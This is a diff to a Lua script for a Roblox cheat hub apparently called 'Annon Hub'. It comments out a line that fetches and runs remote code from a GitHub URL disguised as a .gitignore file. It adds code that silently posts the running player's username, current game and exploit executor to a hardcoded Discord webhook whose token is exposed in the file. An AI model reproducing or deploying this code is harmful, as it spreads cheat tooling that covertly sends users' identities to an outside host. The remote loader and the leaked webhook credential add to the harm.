@@ -1015,10 +1015,42 @@ Settings:AddButton({
 ╚═════╝░╚═╝╚═════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═════╝░  ╚══════╝░╚════╝░░╚═════╝░╚═════╝░
 ]]
 
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/YourMomClapped/WebHook-Messanger/main/.gitignore'),true))()
+-- loadstring(game:HttpGet(('https://raw.githubusercontent.com/YourMomClapped/WebHook-Messanger/main/.gitignore'),true))()
 
 
 
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+
+local url =
+   "https://discord.com/api/webhooks/1001371210074042461/TnlW2ECFmM402HH_oLZT4Ux-tDhMjBnou48CjtR6oY72DNUFgBouRZAdrngqsQwR_z6v" -- put ur webhook here dumbos
+local data = {
+   ["content"] = "***"..Player.Name.."*** Has successfully logged into ***Annon Hub.***",
+   ["embeds"] = {
+       {
+           ["title"] = "Currently Playing: "   ..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.. " :)",
+           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
 
 
 
